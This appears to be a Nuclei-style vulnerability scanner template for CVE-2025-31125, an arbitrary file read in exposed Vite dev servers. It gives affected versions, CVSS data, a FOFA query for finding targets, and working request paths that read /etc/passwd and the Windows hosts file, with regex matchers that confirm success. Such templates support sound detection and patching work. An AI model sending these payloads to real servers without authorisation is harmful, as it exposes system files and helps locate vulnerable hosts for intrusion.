id: CVE-2025-31125

info:
  name: Vite - Arbitrary File Read
  author: v2htw
  severity: medium
  description: |
    漏洞源于 Vite 在处理带有特定查询参数的 URL 时，正则表达式和参数处理逻辑存在缺陷，导致安全检查被绕过。攻击者利用这一缺陷，通过精心构造的请求路径，访问服务器上不在允许访问列表中的文件。
    Vite 开发服务器需通过 --host 或 server.host 配置选项暴露到网络（默认仅限本地访问）。
    6.2.0 <= vite <= 6.2.3
    6.1.0 <= vite <= 6.1.2
    6.0.0 <= vite <= 6.0.12
    5.0.0 <= vite <= 5.4.15
    vite <= 4.5.10
  reference:
    - https://github.com/advisories/GHSA-4r4m-qw57-chr8
    - https://mp.weixin.qq.com/s/dFZ1kk5aqG-BtuQ5mUSiOg
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N
    cvss-score: 5.3
    cve-id: CVE-2025-31125
    cwe-id: CWE-284
  metadata:
    verified: true
    max-request: 1
    fofa-query: 'body="/@vite/client"'
  tags: Vite-App

http:
  - method: GET
    path:
      - "{{BaseURL}}/etc/passwd?import&?inline=1.wasm?init"
      - "{{BaseURL}}/@fs/etc/passwd?import&?inline=1.wasm?init"
      - "{{BaseURL}}/C:/Windows/System32/drivers/etc/hosts?import&?inline=1.wasm?init"
      - "{{BaseURL}}/@fs/C:/Windows/System32/drivers/etc/hosts?import&?inline=1.wasm?init"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"
          - "Microsoft Corp"
        condition: or

      - type: status
        status:
          - 200
# digest: 4b0a00483046022100b9f1be4fe223712c9e597c0609d96008779c63810723b5ee0a1216254f406d800221009f1ce6616f79bcbd9ee9f286a6d6696f6dcc9c493f01155de9fa89658a04533f:922c64590222798bb761d5b6d8e72950